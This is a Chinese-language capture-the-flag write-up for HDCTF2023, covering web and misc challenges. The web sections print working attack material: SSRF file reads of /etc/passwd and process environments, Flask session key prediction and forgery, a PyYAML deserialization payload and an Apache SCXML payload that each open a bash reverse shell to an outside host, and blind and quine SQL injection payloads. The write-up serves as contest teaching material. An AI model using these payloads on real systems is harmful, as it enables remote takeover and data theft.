## 【HDCTF2023】wp

[TOC]



### web

#### Welcome To HDCTF 2023

在源码的 `game.js`中找到了flag

![image-20230423142427742](https://s2.loli.net/2023/04/23/J7VbOSAQ5RPTemE.png)



在控制台输出 `console.log(seeeeeeeecret)`得flag



#### SearchMaster

使用dirmap扫描目录，发现：`composer.json`，访问一下：

```json
{
    "name": "smarty/smarty",
    "type": "library",
    "description": "Smarty - the compiling PHP template engine",
    "keywords": [
        "templating"
    ],
    "homepage": "https://smarty-php.github.io/smarty/",
    "license": "LGPL-3.0",
    "authors": [
        {
            "name": "Monte Ohrt",
            "email": "monte@ohrt.com"
        },
        {
            "name": "Uwe Tews",
            "email": "uwe.tews@googlemail.com"
        },
        {
            "name": "Rodney Rehm",
            "email": "rodney.rehm@medialize.de"
        },
        {
            "name": "Simon Wisselink",
            "homepage": "https://www.iwink.nl/"
        }
    ],
    "support": {
        "issues": "https://github.com/smarty-php/smarty/issues",
        "forum": "https://github.com/smarty-php/smarty/discussions"
    },
    "require": {
        "php": "^7.1 || ^8.0"
    },
    "autoload": {
        "classmap": [
            "libs/"
        ]
    },
    "extra": {
        "branch-alias": {
            "dev-master": "4.0.x-dev"
        }
    },
    "require-dev": {
        "phpunit/phpunit": "^8.5 || ^7.5",
        "smarty/smarty-lexer": "^3.1"
    }
}
```

发现是 php `smarty模板注入`

![image-20230423143014048](https://s2.loli.net/2023/04/23/RZek9xBPizXCM3u.png)

提示我们需要使用post方式上传一个名为 data的变量：

测试一下确实有回显：

![image-20230423143124024](https://s2.loli.net/2023/04/23/eHrD8dGWljBgfvO.png)

直接读flag：

![image-20230423143218303](https://s2.loli.net/2023/04/23/k5AqdwPLGaz9XrC.png)





#### YamiYami

进入题目：

![image-20230423143948531](https://s2.loli.net/2023/04/23/nJmBkxYw3PaOfrF.png)

当我们点击 `Read somethings`时：

```
http://node2.anna.nssctf.cn:28523/read?url=https://baidu.com
```

我们发现可以读取到百度首页的内容，这是**SSRF**（突然忘记了）

python中我们可以使用 `file伪协议`读取文件内容

我们尝试一下读取 `/etc/passwd`

![image-20230423144508490](https://s2.loli.net/2023/04/23/gQ8YnFWyh2HAJak.png)



成功读取



非预期解：（直接读取环境变量）

```
file:///proc/1/environ   # 这里读的是pid为1的进程
```

![image-20230423144607816](https://s2.loli.net/2023/04/23/agHbZnvudWrm6to.png)



如果读取当前进程的环境变量是读取不到的：

![image-20230423145412951](https://s2.loli.net/2023/04/23/GRhokPMEr7q1J43.png)





[Linux-Proc目录的利用](https://xz.aliyun.com/t/10579)



预期解：

我们进去发现了三个路由，但是第一个read路由可以读取指定url的内容，易知这是`SSRF`

<img src="https://s2.loli.net/2023/04/28/qzVHPOj3irdvxa6.png" alt="image-20230428111516922" style="zoom:33%;" />

我们点击 pwd，显示 `/app`，说明此时文件在`/app`目录下面

由于这是python写的题，我们很容易猜到文件名是 `app.py`

于是我们想要使用file协议去读取 `/app/app.py`文件

![image-20230428111931565](https://s2.loli.net/2023/04/28/Kpf23XZuvmSrBEG.png)

结果`app`被过滤了

这里我们可以将 `app`字段**两次url编码绕过**

![image-20230428112210448](https://s2.loli.net/2023/04/28/xG42dwNWDjXIr7K.png)

获得源码：

```python

#encoding:utf-8
import os
import re, random, uuid
from flask import *
from werkzeug.utils import *
import yaml
from urllib.request import urlopen
app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = False
BLACK_LIST=["yaml","YAML","YML","yml","yamiyami"]
app.config['UPLOAD_FOLDER']="/app/uploads"

@app.route('/')
def index():
    session['passport'] = 'YamiYami'
    return '''
    Welcome to HDCTF2023 <a href="/read?url=https://baidu.com">Read somethings</a>
    <br>
    Here is the challenge <a href="/upload">Upload file</a>
    <br>
    Enjoy it <a href="/pwd">pwd</a>
    '''
@app.route('/pwd')
def pwd():
    return str(pwdpath)
@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('app.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m:
            return "re.findall('app.*', url, re.IGNORECASE)"
        if n:
            return "re.findall('flag', url, re.IGNORECASE)"
        res = urlopen(url)
        return res.read()
    except Exception as ex:
        print(str(ex))
    return 'no response'

def allowed_file(filename):
   for blackstr in BLACK_LIST:
       if blackstr in filename:
           return False
   return True
@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            return "Empty file"
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            if not os.path.exists('./uploads/'):
                os.makedirs('./uploads/')
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return "upload successfully!"
    return render_template("index.html")
@app.route('/boogipop')
def load():
    if session.get("passport")=="Welcome To HDCTF2023":
        LoadedFile=request.args.get("file")
        if not os.path.exists(LoadedFile):
            return "file not exists"
        with open(LoadedFile) as f:
            yaml.full_load(f)
            f.close()
        return "van you see"
    else:
        return "No Auth bro"
if __name__=='__main__':
    pwdpath = os.popen("pwd").read()
    app.run(
        debug=False,
        host="0.0.0.0"
    )
    print(app.config['SECRET_KEY'])

```

我们阅读一下read路由的源码：

```python
url = request.args.get('url')
m = re.findall('app.*', url, re.IGNORECASE)
n = re.findall('flag', url, re.IGNORECASE)
if m:
return "re.findall('app.*', url, re.IGNORECASE)"
if n:
return "re.findall('flag', url, re.IGNORECASE)"
res = urlopen(url)
return res.read()
```

我们发现获得的url会使用 `urlopen()`去读取指定url的内容，因此，我们可以url编码两次，第一次浏览器自动解码，然后获得被编码一次的url，这时可以绕过 `re.findall()`正则，`urlopen()`函数可以解析包含urlencode的网址，这样我们知道为什么可以两次编码绕过了



```python
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
```

这一段代码，`random.seed()`函数将会指定一个随机数种子，如果是固定值的话，会产生伪随机，每次固定位置的随机数都是一样的

> `uuid.getnode()`函数用于获取网络接口的MAC地址。如果机器具有多个网络接口，则返回通用管理的MAC地址，而不是通过本地管理的MAC地址返回。管理的MAC地址保证是全局唯一的

`uuid.getnode()`可以用来获取网口的mac地址，因此是一个固定值，会生成伪随机，我们需要获取到mac地址

<img src="https://s2.loli.net/2023/04/28/g9OC581ytisKUVb.png" alt="image-20230428113423797" style="zoom:33%;" />

我们可以使用：

```
/sys/class/net/eth0/address
```

获取 eth0 网卡的mac地址

<img src="https://s2.loli.net/2023/04/28/KgwbrZAGf2TLnNk.png" alt="image-20230428113543582" style="zoom:33%;" />

这是16进制的值，于是我们可以使用脚本生成 `SECRET_KEY`的值了：

```python
import random
import uuid

random.seed(0x0242ac025164)
print(random.random()*233)

# 16.703189614984886
```

得到key，我们可以使用 session伪造脚本伪造session了

![image-20230428113758500](https://s2.loli.net/2023/04/28/uZD1X4zqpAjTcsU.png)

```python
@app.route('/boogipop')
def load():
    if session.get("passport")=="Welcome To HDCTF2023":
        LoadedFile=request.args.get("file")
        if not os.path.exists(LoadedFile):
            return "file not exists"
        with open(LoadedFile) as f:
            yaml.full_load(f)
            f.close()
```

这里主要利用 `boogipop`路由，**yaml反序列化**

这个暂时不太会，直接放payload：

```python
!!python/object/new:str
    args: []
    state: !!python/tuple
      - "__import__('os').system('bash -c \"bash -i >& /dev/tcp/ip/port <&1\"')"
      - !!python/object/new:staticmethod
        args: []
        state:
          update: !!python/name:eval
          items: !!python/name:list
```

我们将IP、port改为自己的，然后在服务器开启监听，上传这个文件，然后利用boogipop路由即可：

![image-20230428114313417](https://s2.loli.net/2023/04/28/chQam2LvRYqZUuD.png)

注意改一下session

![image-20230428114353862](https://s2.loli.net/2023/04/28/KZU5rnYScgzbHsA.png)

在	`/proc/1/environ` 发现flag





#### LoginMaster



**robots.txt泄露**

```php
<?php
function checkSql($s) 
{
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}
if ($row['password'] === $password) {
        die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
```

sql注入题目，username必须为admin，此处我们需要从密码着手

但是注意看，过滤了 `in` ，意味着我们不能使用 `information_schema`库查询表名，列名

我本来是想找一下除了`information_schema`库，还有哪些库能用来查询的，找了这么几个：

```
mysql.innodb_table_stats
sys.schema_table_statistics
sys.schema_table_statistics_with_buffer
```

这几个都能用来查询表名，此处我们可以使用下面两个，我们我们写脚本去查询表名：

```python
import requests

url = "http://node5.anna.nssctf.cn:28973"
flag = ""
s = "0123456789abcdefghijklmnopqrstuvwxyz-{}_.,"

for i in range(60):
    for j in s:
        # payload = "1'/**/or/**/if((mid((select/**/version()),{},1)/**/like/**/'{}'),1,0)#".format(i, j) # 10_2_32-mariadb
        # payload = "1'/**/or/**/if((mid((select/**/database()),{},1)/**/like/**/'{}'),1,0)#".format(i, j) # ciscn
        # payload = "1'/**/or/**/if((mid((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics),{},1)/**/like/**/'{}'),1,0)#".format(i, j)
        payload = "1'/**/or/**/if((mid((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics/**/where/**/table_schema/**/like/**/'ciscn'),{},1)/**/like/**/'{}'),1,0)#".format(i, j)
        data = {
            'username': 'admin',
            'password': payload
        }
        req = requests.post(url=url, data=data)
        # print(payload)
        # print(req.text)
        if 'hacker' in req.text:
            print(payload)
        if 'something' in req.text:
            print("someting")
        if 'wrong password' in req.text:
            flag += j
            print(flag)
            break
```

发现啥都查不出来。。



实际上此处为一张空表，我们需要使用另一种做法(**quine**)

重点的代码是这里：

```php
if ($row['password'] === $password) {
        die($FLAG);
    } 
```

我们除了让输入的密码与真正的密码一致外，还可以让**输入的结果与输出的结果相同**，同样可以实现获得flag



举个例子：

```sql
select replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
```

![image-20230423152442610](https://s2.loli.net/2023/04/23/GhX91m7y3JwE85Y.png)

输入和输出结果一致，从而可以绕过



这里需要知道一下原理：

[从三道赛题再谈Quine trick](https://www.anquanke.com/post/id/253570#h2-9)

[CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）](https://www.cnblogs.com/zhengna/p/15917521.html)

[NSS日刷-[第五空间 2021]yet_another_mysql_injection-Qunie](https://www.cnblogs.com/aninock/p/16467716.html)



看着有点烧脑，其实就是套娃

我们首先尝试一下：

```sql
select REPLACE('.',char(46),'.');
```

![image-20230423153453045](https://s2.loli.net/2023/04/23/rtYn4WiP9T2D7Io.png)

输出是一个小数点 .



我们尝试将 上一段代码中的小数点 **.** 替换为：

```sql
REPLACE(".",char(46),".")   -- 这里使用双引号包裹，防止单双引号重叠
```

完整代码：

```sql
select REPLACE('REPLACE(".",char(46),".")',char(46),'REPLACE(".",char(46),".")');
```

![image-20230423153432347](https://s2.loli.net/2023/04/23/Qsg7HvIrREJfYFN.png)

乍一看好像是一样的，但是单双引号有点区别，我们需要再套`REPLACE`替换一下

```sql
select replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
```

![image-20230423155242323](https://s2.loli.net/2023/04/23/yma7of36rFAWenx.png)

是真的麻烦。。



基本上就是这种思路了



payload：

```sql
1'UNION(SELECT(REPLACE(REPLACE('1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#',CHAR(34),CHAR(39)),CHAR(37),'1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#')))#
```

![image-20230423155425281](https://s2.loli.net/2023/04/23/Qi3aLjHIevkZFd4.png)





#### BabyJxVx

> 考点：Apache SCXML2 RCE

[Apache SCXML2 RCE分析](https://www.yuque.com/boogipop/okvgcs/zzx3n35xsg26ss0e?view=doc_embed)

暂时不懂为什么

直接放payload：

```xml
<?xml version="1.0"?>
<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
    <final id="run">
        <onexit>
            <assign location="flag" expr="''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMjkuMTcwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}')"/>
        </onexit>
    </final>
</scxml>
```

然后上传到服务器上面，`poc.xml`

注意base64要替换为自己的vps信息，然后在服务器上开启监听：

<img src="https://s2.loli.net/2023/04/28/QkzTJGgnpCYmEwq.png" alt="image-20230428115926577" style="zoom:50%;" />

![image-20230428120008392](https://s2.loli.net/2023/04/28/iSUQgdNza9xtkAT.png)

然后命令执行得flag

<img src="https://s2.loli.net/2023/04/28/HD6uw28tZUVKPxk.png" alt="image-20230428120105755" style="zoom:33%;" />





### misc

#### hardMisc

010打开，base64解码

![image-20230423155953654](https://s2.loli.net/2023/04/23/Cpm6MVAWPBNkRhn.png)



#### MasterMisc

![image-20230423160525223](https://s2.loli.net/2023/04/23/PZ7zjbhpCr8K9IL.png)

打开发现有很多压缩包，

百度查了一下，这种是`分卷压缩包`，我们可以在cmd中输入如下命令，合并为一个压缩包：

```
copy /B topic.zip.001+topic.zip.002+topic.zip.003+topic.zip.004+topic.zip.005+topic.zip.006 topic.zip
```

![image-20230423161002616](https://s2.loli.net/2023/04/23/OTIaA9qfQHRj4Mr.png)

爆破一下找到压缩包密码，使用`foremost`分离图片：

得到一个wav音频和一张绿色的图片，我们使用`Audacity`看一下频谱图：

![image-20230423161240384](https://s2.loli.net/2023/04/23/UKqwkQuHBLi73Sm.png)

找到一部分flag

使用010修改绿色图片高度：

![image-20230423161334548](https://s2.loli.net/2023/04/23/Dkm7UM6NtRAZQIP.png)

得到另一部分flag，

最后一部分在`topic.png`中找到：

![image-20230423161418358](https://s2.loli.net/2023/04/23/8dBH2RcpnGUzJWS.png)



NSSCTF{e67d8104-7536-4433-bfff-96759901c405}



#### ExtremeMisc

一张 `IDAT.png` 首先使用 foremost分离一下，得到一个 `Dic.zip`

使用 `Ziperello`工具说没有加密，还以为是伪加密。。坑人

其实这里的密码是字母（以前一般都是数字），使用`Archpr`爆破得到密码：`haida`

打开`Reverse.piz`：

![image-20230423173129578](https://s2.loli.net/2023/04/23/4gwfGaDMRi3b8nK.png)

很明显，这里每一个字节都需要反转一下，需要写个脚本：

```python
f = open("C://Users/LIKE/Desktop/Reverse.piz", "rb")
data = f.read()
fzip = open("C://Users/LIKE/Desktop/fzip.zip", "wb")
s = b""

for i in data:
    tmp = int(("%02x" % i)[::-1], 16)

    s += bytes([tmp])
    # print(tmp.to_bytes(1, 'little'))

fzip.write(s)

首先以二进制形式读取文件给data，然后遍历这些二进制字符串，
注意：int(("%02x" % i)[::-1], 16)  我们将二进制转化为16进制然后宽度为2，不够使用0填充，
然后反转一下，并使用int()函数转为10进制
然后将10进制数字转为字节bytes([])进行拼接，最后以二进制格式写入
```

写这种编码转化的脚本不是很会，需要多学一学

[字节到大整数的打包与解包](https://python3-cookbook.readthedocs.io/zh_CN/latest/c03/p05_pack_unpack_large_int_from_bytes.html)



然后再使用爆破zip，获得如下文件：

![image-20230423174633982](https://s2.loli.net/2023/04/23/IZ4RtANWpmS6jaX.png)

很明显，在`Plain.zip`中存在内容已知的 `secret.txt`文件，我们可以使用明文爆破，`ARCHPR`或`bkcrack`

这里我们选择 `bkcrack`速度快一点：

```
./bkcrack -C Plain.zip -c "secret.txt" -p secret.txt
```

![image-20230423174819872](https://s2.loli.net/2023/04/23/ybx4SM7QNpPejmv.png)

爆出来3个key，用这些key去产生一个新的压缩包，密码自己设置：

```
bkcrack -C Plain.zip -c "secret.txt" -k ec437a15 db89e36d cd3e8e15 -U flag.zip 123
```

我们使用 `-U 参数` 生成了一个新的flag.zip压缩包，密码123：

使用密码打开 `flag.txt`

![image-20230423175025410](https://s2.loli.net/2023/04/23/KhmEnls6vfUA9Jy.png)





#### SuperMisc

打开文件夹，发现存在 `.git` 文件夹，说明使用了git，我们`git log`查看一下日志：

![image-20230424111856953](https://s2.loli.net/2023/04/24/d4aDEFOrGCnI2Bc.png)

发现存在提交记录，于是我们切换到第二次提交的时候：

```
git reset --hard e9286d88c95ab6411b323dca8f358abc3a7e204f
```



![image-20230424112004591](https://s2.loli.net/2023/04/24/2gQl7wZbHjv3Kcn.png)

发现多了一个压缩包 `Vigenere.zip`,但是不知道密码，于是我们使用010打开png图片：

![image-20230424112124160](https://s2.loli.net/2023/04/24/6CNQvSDTL7zhA3e.png)

发现很多 0、1的二进制数据，我们把它提取出来放到 `data.txt`中：

![image-20230424112233522](https://s2.loli.net/2023/04/24/QpPNzuAmXBrG6lS.png)

我们猜测这可能需要使用这些0、1组成图片：

于是我们写个脚本将这些16进制的转化为普通的文本文件`out.txt`：

```python
f = open("C://Users/LIKE/Desktop/data.txt", "rb")
fw = open("C://Users/LIKE/Desktop/out.txt", "w")
s = ""
data = f.read()
for i in data:
    ch = "%02x" % i
    s += ch

fw.write(s)
```

![image-20230424112501328](https://s2.loli.net/2023/04/24/1ymDXsz8wGaQ9AM.png)

然后使用python脚本将01转化为图片：

```python
from PIL import Image

fr = open("C://Users/LIKE/Desktop/out.txt", "r")
data = fr.read()

img = Image.new("RGB", (1150, 1150))

# print(data)
i = 0
for x in range(1150):
    for y in range(1150):
        if data[i] == "1":
            img.putpixel((x, y), (255, 255, 255))
        elif data[i] == "0":
            img.putpixel((x, y), (0, 0, 0))
        i += 1

img.show()
img.save("flag.png")
```

<img src="https://s2.loli.net/2023/04/24/YElLXTxviS9On6a.png" alt="flag" style="zoom: 25%;" />

扫描二维码：

```
11000#11111#10000#01111#11000#00011#11000#00011#00011#100#00011#01111#10000#00011#00011#00001#10000#00111#00011#00001#10000#00001#00011#11111#00011#11111#00111#100#00011#11000#00011#00001#10000#00001#10000#10000#00111#100#00011#00001#00011#00001#00011#11110#00011#00111#00111#100#10000#00111#00011#11111#00011#00001#00011#11110#00111#100#00011#00000#00011#11100#00011#00111#10000#00000#10000#00000#00011#11100#00011#00011#00011#11111#00011#11110#10000#00000#00011#10000#00011#00000
```

使用 0、1、#  3中字符组成，猜测这应该是莫斯密码：

<img src="https://s2.loli.net/2023/04/24/nN4T6iSy9M3DHCY.png" alt="image-20230424112703479" style="zoom:33%;" />

然后将16进制转为字符串：

![image-20230424112728145](https://s2.loli.net/2023/04/24/E7ZV2Hvc1bNsSoq.png)

获得压缩包密码，解密获得 `Vigenere` 文件：

我们使用 `file`命令查看一下是什么文件：

![image-20230424113112354](https://s2.loli.net/2023/04/24/rJQ4NvpdW2qw7bz.png)

在010中打开得到字符串：

![image-20230424113413288](https://s2.loli.net/2023/04/24/idZaephToUvDLnk.png)

或者 `strings`：

![image-20230424113438992](https://s2.loli.net/2023/04/24/wJNdqZlxGfjOgnM.png)

然后结合文件名，知道是`维吉尼亚密码`，但是需要密钥

[使用大佬脚本根据明文爆破密钥](https://github.com/Byxs20/Vigenere-Tools)

![image-20230424114943236](https://s2.loli.net/2023/04/24/9b837dPALXVORsz.png)

获得密钥 `IBFQW`:

![image-20230424115032601](https://s2.loli.net/2023/04/24/oOVudAp26UGvFlM.png)









